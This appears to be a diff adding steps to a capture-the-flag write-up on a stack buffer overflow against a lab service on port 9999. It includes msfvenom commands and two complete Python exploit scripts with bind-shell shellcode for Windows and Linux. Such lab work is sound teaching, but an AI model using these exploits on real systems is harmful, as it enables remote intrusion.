@@ -301,6 +301,132 @@ Restart Immunity Debugger again. In white line on the bottom, type
 
 ![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/f50d1a77-5f95-43a0-99dc-94057eccd09d)
 
+So now we have the offset (how many bytes until the EIP is overwritten), the address of the "JMP ESP" instruction which will tell the program to execute the JMP ESP instruction which will jump to whatever is on the stack. 
 
 
- 
+Now we need some padding, which are called nop's. Here you can use "\x90" and use 16 - 32 bytes padding. Depending on the space that you have available, in some situations you will have to adjust the size of the nops. In this case it doesn't matter and I will use 32 bytes because my payload will not reach the limit. If your payload is too big, use less nops.
+
+
+We have the offset, the address of the jmp esp instruction and the nops and now we need the shellcode that is executed after the program executes jmp esp (because the shellcode will be on top of the stack). Msfvenom can be used to generate the shellcode. 
+
+
+We will use a non staged, bind_tcp payload, because I had problems using the staged bind_tcp payload. We generate it using the following command:
+
+```
+msfvenom -p windows/shell_bind_tcp RHOST=*windows_machine_ip* LPORT=1339 EXITFUNC=thread -f python -a x86 -b "\x00" -v shellcode
+```
+p = \*payload type\*
+RHOST=\*target ip\*
+LPORT=\*port that is opened on the target that hosts the shell\*
+EXITFUNC=\*the shellcode will be executed in a thread on the target\*
+f = \*the language that the exploit is written in that the generated shellcode is in the correct format, e.g. in python there is no ; at the end of an instruction, but in C\*
+a = architecture
+b = bad characters (in this case we only found \x00)
+v = variable_name of the shellcode
+
+
+So far this is our exploit.py:
+```
+#!/usr/bin/env python3
+
+import socket
+import time
+
+ip = "windows_machine_ip"
+# 311712F3
+offset = b"A"*524
+
+shellcode =  b""
+shellcode += b"\xd9\xe1\xb8\xbe\x2b\x6d\xb3\xd9\x74\x24\xf4"
+shellcode += b"\x5b\x31\xc9\xb1\x53\x31\x43\x17\x03\x43\x17"
+shellcode += b"\x83\x7d\x2f\x8f\x46\x7d\xd8\xcd\xa9\x7d\x19"
+shellcode += b"\xb2\x20\x98\x28\xf2\x57\xe9\x1b\xc2\x1c\xbf"
+shellcode += b"\x97\xa9\x71\x2b\x23\xdf\x5d\x5c\x84\x6a\xb8"
+shellcode += b"\x53\x15\xc6\xf8\xf2\x95\x15\x2d\xd4\xa4\xd5"
+shellcode += b"\x20\x15\xe0\x08\xc8\x47\xb9\x47\x7f\x77\xce"
+shellcode += b"\x12\xbc\xfc\x9c\xb3\xc4\xe1\x55\xb5\xe5\xb4"
+shellcode += b"\xee\xec\x25\x37\x22\x85\x6f\x2f\x27\xa0\x26"
+shellcode += b"\xc4\x93\x5e\xb9\x0c\xea\x9f\x16\x71\xc2\x6d"
+shellcode += b"\x66\xb6\xe5\x8d\x1d\xce\x15\x33\x26\x15\x67"
+shellcode += b"\xef\xa3\x8d\xcf\x64\x13\x69\xf1\xa9\xc2\xfa"
+shellcode += b"\xfd\x06\x80\xa4\xe1\x99\x45\xdf\x1e\x11\x68"
+shellcode += b"\x0f\x97\x61\x4f\x8b\xf3\x32\xee\x8a\x59\x94"
+shellcode += b"\x0f\xcc\x01\x49\xaa\x87\xac\x9e\xc7\xca\xb8"
+shellcode += b"\x53\xea\xf4\x38\xfc\x7d\x87\x0a\xa3\xd5\x0f"
+shellcode += b"\x27\x2c\xf0\xc8\x48\x07\x44\x46\xb7\xa8\xb5"
+shellcode += b"\x4f\x7c\xfc\xe5\xe7\x55\x7d\x6e\xf7\x5a\xa8"
+shellcode += b"\x1b\xff\xfd\x03\x3e\x02\xbd\xf3\xfe\xac\x56"
+shellcode += b"\x1e\xf1\x93\x47\x21\xdb\xbc\xe0\xdc\xe4\xc7"
+shellcode += b"\xcb\x69\x02\xad\x3b\x3c\x9c\x59\xfe\x1b\x15"
+shellcode += b"\xfe\x01\x4e\x0d\x68\x49\x98\x8a\x97\x4a\x8e"
+shellcode += b"\xbc\x0f\xc1\xdd\x78\x2e\xd6\xcb\x28\x27\x41"
+shellcode += b"\x81\xb8\x0a\xf3\x96\x90\xfc\x90\x05\x7f\xfc"
+shellcode += b"\xdf\x35\x28\xab\x88\x88\x21\x39\x25\xb2\x9b"
+shellcode += b"\x5f\xb4\x22\xe3\xdb\x63\x97\xea\xe2\xe6\xa3"
+shellcode += b"\xc8\xf4\x3e\x2b\x55\xa0\xee\x7a\x03\x1e\x49"
+shellcode += b"\xd5\xe5\xc8\x03\x8a\xaf\x9c\xd2\xe0\x6f\xda"
+shellcode += b"\xda\x2c\x06\x02\x6a\x99\x5f\x3d\x43\x4d\x68"
+shellcode += b"\x46\xb9\xed\x97\x9d\x79\x0d\x7a\x37\x74\xa6"
+shellcode += b"\x23\xd2\x35\xab\xd3\x09\x79\xd2\x57\xbb\x02"
+shellcode += b"\x21\x47\xce\x07\x6d\xcf\x23\x7a\xfe\xba\x43"
+shellcode += b"\x29\xff\xee"
+
+payload = offset + b"\xF3\x12\x17\x31" + b"\x90"*32 + shellcode # b"\xF3\x12\x17\x31" 
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, 9999))
+s.send(payload)
+s.close()
+```
+
+Now we restart Immunity Debugger as administrator and attach the process and run the exploit.py. 
+
+
+![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/21a88f16-f961-4630-9efa-d227732ead90)
+
+
+We successfully exploited the buffer overflow vulnerability on our windows machine. Now we adjust our exploit to make it work on linux by regenerating the shellcode using a different payload type:
+
+
+```
+msfvenom -p linux/x86/shell_bind_tcp RHOST=*linux_machine_ip* LPORT=1339 EXITFUNC=thread -f python -a x86 -b "\x00" -v shellcode
+```
+
+We also have to change the IP in the exploit.py. Our exploit.py will look like the following:
+
+
+```
+#!/usr/bin/env python3
+
+import socket
+import time
+
+ip = "linux-machine ip"
+# 311712F3
+offset = b"A"*524
+
+shellcode =  b""
+shellcode += b"\xda\xd6\xb8\x75\x84\x46\x65\xd9\x74\x24\xf4"
+shellcode += b"\x5f\x31\xc9\xb1\x14\x31\x47\x19\x03\x47\x19"
+shellcode += b"\x83\xc7\x04\x97\x71\x77\xbe\xa0\x99\x2b\x03"
+shellcode += b"\x1d\x34\xce\x0a\x40\x78\xa8\xc1\x02\x22\x6b"
+shellcode += b"\x88\x6a\xd7\x93\x29\x51\xbd\x83\x60\xf5\xc8"
+shellcode += b"\x45\xe8\x93\x92\x48\x6d\xd2\x62\x57\xdd\xe0"
+shellcode += b"\xd4\x31\xec\x68\x57\x0e\x88\xa5\xd8\xfd\x0c"
+shellcode += b"\x5f\xe6\x59\x62\x1f\x51\x23\x84\x77\x4d\xfc"
+shellcode += b"\x07\xef\xf9\x2d\x8a\x86\x97\xb8\xa9\x08\x3b"
+shellcode += b"\x32\xcc\x18\xb0\x89\x8f"
+
+payload = offset + b"\xF3\x12\x17\x31" + b"\x90"*32 + shellcode 
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip, 9999))
+s.send(payload)
+s.close()
+```
+
+
+After running the exploit, the port 1339 is open and we can connect to it:
+![grafik](https://github.com/fortyfourh/CTF-writeups/assets/125758265/39f9b4d3-02e9-48f5-bf84-0abecca70b1a)
+
+
